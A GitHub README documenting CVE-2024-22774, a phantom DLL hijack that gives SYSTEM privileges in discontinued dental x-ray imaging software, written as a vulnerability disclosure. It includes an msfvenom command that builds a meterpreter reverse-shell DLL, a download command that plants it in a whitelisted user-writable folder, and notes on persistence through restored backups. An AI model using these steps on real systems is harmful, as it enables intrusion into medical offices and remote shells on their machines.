
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGray-0men%2FCVE-2024-22774)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGray-0men%2FCVE-2024-22774)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Gray-0men%2FCVE-2024-22774)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Gray-0men](/Gray-0men)
/
**[CVE-2024-22774](/Gray-0men/CVE-2024-22774)**
Public

* [Notifications](/login?return_to=%2FGray-0men%2FCVE-2024-22774) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FGray-0men%2FCVE-2024-22774)
* [Star
   0](/login?return_to=%2FGray-0men%2FCVE-2024-22774)

Panoramic Dental Imaging software Stealthy Privilege Escalation Vulnerability

[0
stars](/Gray-0men/CVE-2024-22774/stargazers) [0
forks](/Gray-0men/CVE-2024-22774/forks) [Branches](/Gray-0men/CVE-2024-22774/branches) [Tags](/Gray-0men/CVE-2024-22774/tags) [Activity](/Gray-0men/CVE-2024-22774/activity)
 [Star](/login?return_to=%2FGray-0men%2FCVE-2024-22774)

 [Notifications](/login?return_to=%2FGray-0men%2FCVE-2024-22774) You must be signed in to change notification settings

* [Code](/Gray-0men/CVE-2024-22774)
* [Issues
  0](/Gray-0men/CVE-2024-22774/issues)
* [Pull requests
  0](/Gray-0men/CVE-2024-22774/pulls)
* [Actions](/Gray-0men/CVE-2024-22774/actions)
* [Projects
  0](/Gray-0men/CVE-2024-22774/projects)
* [Security](/Gray-0men/CVE-2024-22774/security)
* [Insights](/Gray-0men/CVE-2024-22774/pulse)

Additional navigation options

* [Code](/Gray-0men/CVE-2024-22774)
* [Issues](/Gray-0men/CVE-2024-22774/issues)
* [Pull requests](/Gray-0men/CVE-2024-22774/pulls)
* [Actions](/Gray-0men/CVE-2024-22774/actions)
* [Projects](/Gray-0men/CVE-2024-22774/projects)
* [Security](/Gray-0men/CVE-2024-22774/security)
* [Insights](/Gray-0men/CVE-2024-22774/pulse)

# Gray-0men/CVE-2024-22774

    main[Branches](/Gray-0men/CVE-2024-22774/branches)[Tags](/Gray-0men/CVE-2024-22774/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[17 Commits](/Gray-0men/CVE-2024-22774/commits/main/) | | |
| [imgs](/Gray-0men/CVE-2024-22774/tree/main/imgs "imgs") | | [imgs](/Gray-0men/CVE-2024-22774/tree/main/imgs "imgs") |  |  |
| [README.md](/Gray-0men/CVE-2024-22774/blob/main/README.md "README.md") | | [README.md](/Gray-0men/CVE-2024-22774/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
## Panoramic Dental Imaging Software 9.1.2.7600. Phantom DLL Hijack Privilege Escalation (CVE-2024-22774)

## Table of Contents

* [Table of Contents](#table-of-contents)
* [Introduction](#introduction)
* [Final Version of the Software](#final-version-of-the-software)
* [Searching for Hijackable DLL](#searching-for-hijackable-dll)
* [Setting up the attack](#setting-up-the-attack)
* [Exploit](#exploit)
* [Persistance after OS install](#persistance-after-os-install)

## Introduction

Originally, this was going to be a write-up on DLL proxying in some dental x-ray machine software, but I stumbled upon a DLL in my research that made me double check it, ultimately finding a privilege escalation vulnerability which got me a CVE.
Early on in my tech career, I used to do tech support for a dental x-ray machine manufacturer before it closed down. I remember the bugs that would come up while working there and always thought it would be a good idea to try to find vulnerabilities in that software. So, seeing as the software is still in use today, I decided to see if I could do anything cool with it now that I'm out of the software support game. I remember some time ago early on in my cyber security studies there were a few juicy hijackable DLLs in that software, I decided I would take a shot at DLL proxying to see if I can get a malicious DLL running while keeping that software functional (really stealthy). Here's the process I followed and how I accidentally discovered a privilege escalation vulnerability that can (theoretically) survive a clean wipe and reinstall of the OS. Hopefully this is useful information for Blue Teamers.

## Final Version of the Software

One thing to note is this software is no longer receiving updates but I know the x-ray machines are still in use around the US today, so there's still some potential risk to this vulnerability. It can be downloaded [here](https://pancorp.com/software/files/PANCORP_DENTAL_IMAGING_9.1.2.7600.exe) along with the software manual [here.](https://pancorp.com/pdf/Panoramic-Dental-Imaging-%28GLAN%29-Windows-10x64-Setup-Rev3.pdf) Another thing to note is IF this software is in use, there's a 99% chance the processes that run and the following locations are whitelisted in whatever ERD/AV is in use, this is also mentioned on page 24 of the software manual. In this write-up I'm going to do the same thing and add these exclusions to match how this software would be installed in every dental office.

1. C:\Program Files (x86)\Panoramic
2. C:\ProgramData\Ajat

[![image](https://github.com/Gray-0men/Write-Ups/raw/main/imgs/pano_av.png?raw=true)](https://github.com/Gray-0men/Write-Ups/blob/main/imgs/pano_av.png?raw=true)

## Searching for Hijackable DLL

After the software is installed and exclusions are added, we fire up Process Monitor and start searching. Add the following filters and restart the "CCS Service" in Services:

1. Process Name is ccsservice.exe then Include
2. Path ends with .dll then Include

Once that populates, you'll notice there are a bunch of hijackable DLLs in this software. You'll see numerous "NAME NOT FOUND" results with a "SUCCESS" for the same DLL, just in a different location right after it. I was scrolling through one day searching for a decent one to try proxying with, and almost all the way to the bottom something caught my eye...

[![image](https://github.com/Gray-0men/Write-Ups/raw/main/imgs/pano_proc_mon.png?raw=true)](https://github.com/Gray-0men/Write-Ups/blob/main/imgs/pano_proc_mon.png?raw=true)

Could it be?? IT IS. This is a phantom DLL being invoked with SYSTEM integrity from a User writeable location.
Essentially, this is a DLL that wouldn't be good for proxying as there's no actual DLL located somewhere on the machine, so windows is going to try to invoke it from a predefined set of folders in a specific order.

1. The directory from which the application loaded
2. The system directory
3. The 16-bit system directory
4. The Windows directory
5. The current directory
6. The directories that are listed in the PATH environment variable

And in our scenario the 5th location is `C:\ProgramData\Ajat\panoramic\datastor\lnrdlib.dll`
and this location all Users have read, write, and execute permissions. To top it off, this location is a child folder of `C:\ProgramData\Ajat\` which should be whitelisted in every environment this is in use.

[![image](https://github.com/Gray-0men/Write-Ups/raw/main/imgs/pano_perms.png?raw=true)](https://github.com/Gray-0men/Write-Ups/blob/main/imgs/pano_perms.png?raw=true)

## Setting up the attack

Here's the network setup for this test:

* Kali - 10.0.1.137
* Windows 10 64x - 10.0.1.128

Let's start off with creating a simple vanilla meterpreter dll since we don't really need to worry about AV, then spin up an http server to transfer it.

```
## msfvenom to make dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.1.137 LPORT=443 -f dll > lnrdlib.dll

## python http server
python3 -m http.server 80

```

Back over on Windows, lets switch to our standard user account, open powershell, and navigate on over to that datastor folder and run the following:
`wget http://10.0.1.137/lnrdlib.dll -outfile lnrdlib.dll`

[![image](https://github.com/Gray-0men/Write-Ups/raw/main/imgs/pano_cmd.png?raw=true)](https://github.com/Gray-0men/Write-Ups/blob/main/imgs/pano_cmd.png?raw=true)

## Exploit

If everything was done correctly all we need to do to trigger the exploit is restart the computer (since that's something a normal user can do, restarting the CCS Service will also trigger this).

[![image](https://github.com/Gray-0men/Write-Ups/raw/main/imgs/pano_msf.png?raw=true)](https://github.com/Gray-0men/Write-Ups/blob/main/imgs/pano_msf.png?raw=true)

SUCCESS!!!

## Persistence after OS install

Now, one of the key things about the datastor location is that it's one of the two locations that should be backed up in case the computer needs to be wiped or replaced for whatever reason and the software reinstalled. If the contents of the `calib` folder are lost, a technician will need to come out and recalibrate the x-ray machine to get those back. If the `datastor` files are lost, then you lose the most recent x-ray images that weren't saved yet, so this location is somewhat optional to backup. This location is where the malware will reside so it's theoretically possible for someone to accidentally re-infect a computer with the malware if they restore the contents of a backed up datastor, that had the malware and all those recent x-ray images taken, in the new computer. This is mentioned on page two of the software manual.

[![image](https://github.com/Gray-0men/Write-Ups/raw/main/imgs/pano_calib.png?raw=true)](https://github.com/Gray-0men/Write-Ups/blob/main/imgs/pano_calib.png?raw=true)

## About

Panoramic Dental Imaging software Stealthy Privilege Escalation Vulnerability

### Resources

[Readme](#readme-ov-file)

[Activity](/Gray-0men/CVE-2024-22774/activity)
### Stars

[**0**
stars](/Gray-0men/CVE-2024-22774/stargazers)
### Watchers

[**1**
watching](/Gray-0men/CVE-2024-22774/watchers)
### Forks

[**0**
forks](/Gray-0men/CVE-2024-22774/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FGray-0men%2FCVE-2024-22774&report=Gray-0men+%28user%29)

## [Releases](/Gray-0men/CVE-2024-22774/releases)

No releases published

## [Packages 0](/users/Gray-0men/packages?repo_name=CVE-2024-22774)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

